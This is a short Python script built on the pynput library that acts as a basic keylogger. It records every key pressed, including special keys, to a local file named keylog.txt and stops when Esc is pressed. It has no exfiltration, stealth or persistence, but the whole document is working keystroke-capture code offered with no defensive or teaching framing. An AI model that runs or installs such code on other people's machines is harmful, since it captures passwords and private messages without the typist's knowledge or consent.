from pynput.keyboard import Key, Listener

# Define a file where we store the key logs
log_file = "keylog.txt"

# Function to log key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")  # Write key to file
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"Special key {key} pressed\n")

# Function to stop the listener when 'esc' is pressed
def on_release(key):
    if key == Key.esc:
        return False  # Stops the listener

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
